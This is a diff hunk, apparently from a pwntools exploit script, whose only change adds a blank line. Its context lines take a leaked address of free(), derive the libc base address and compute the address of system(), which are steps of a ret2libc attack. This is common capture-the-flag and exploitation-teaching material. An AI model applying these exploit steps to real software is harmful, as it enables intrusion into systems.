@@ -103,6 +103,7 @@ log.info('[got] free address: {:#x}'.format(free_addr))
 libc_addr = free_addr - libc.symbols['free']
 log.info('[got] libc address: {:#x}'.format(libc_addr))
 
+
 system_addr = libc_addr + libc.symbols['system']
 log.info("leaked system() address: {:#x}".format(system_addr))
 
